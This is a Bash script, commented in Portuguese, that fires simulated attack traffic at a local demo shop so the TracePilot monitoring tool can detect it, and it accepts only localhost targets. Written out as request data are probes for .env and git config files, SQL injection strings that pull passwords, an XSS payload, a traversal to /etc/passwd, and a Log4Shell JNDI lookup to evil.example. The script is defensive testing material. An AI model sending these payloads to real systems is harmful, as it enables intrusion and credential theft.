#!/usr/bin/env bash
# Simula tráfego suspeito contra a loja de DEMONSTRAÇÃO local, para o
# TracePilot detectar no painel (seção Segurança e nó Usuários do mapa).
# Só aceita alvo em localhost/127.0.0.1 — não aponte para sistemas de terceiros.
#
# Uso: scripts/simulate-attack.sh [url]     (padrão: http://localhost:8088)
set -euo pipefail
TARGET="${1:-http://localhost:8088}"
case "$TARGET" in
  http://localhost:*|http://127.0.0.1:*) ;;
  *) echo "Por segurança, só simula contra localhost." >&2; exit 1 ;;
esac

hit() { curl -s -o /dev/null -m 3 -A "$1" "$TARGET$2" || true; }

echo "1/4 Robô de varredura procurando arquivos esquecidos"
for p in /.env /.git/config /wp-login.php /phpmyadmin/ /server-status /config.json /backup.sql /admin.php; do
  hit "Mozilla/5.0 (compatible; Nuclei - Open-source project)" "$p"
done
for i in $(seq 1 16); do hit "Mozilla/5.0" "/pagina-inexistente-$i"; done

echo "2/4 Tentativas de SQL injection, XSS e path traversal"
hit "sqlmap/1.8.2#stable (https://sqlmap.org)" "/products/1%27%20OR%20%271%27=%271"
hit "sqlmap/1.8.2#stable (https://sqlmap.org)" "/products?q=1%20UNION%20SELECT%20password%20FROM%20users--"
hit "Mozilla/5.0" "/products?q=%3Cscript%3Ealert(1)%3C/script%3E"
hit "Mozilla/5.0" "/static/../../../../etc/passwd"
hit "Mozilla/5.0" "/products?q=%24%7Bjndi:ldap://evil.example/a%7D"

echo "3/4 Crawler copiando o catálogo"
for i in $(seq 1 12); do hit "python-requests/2.32.3" "/products/$(( (i % 9) + 1 ))"; done
hit "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "/"

echo "4/4 Pronto. Em até 10 s aparece no painel (seção Segurança)."
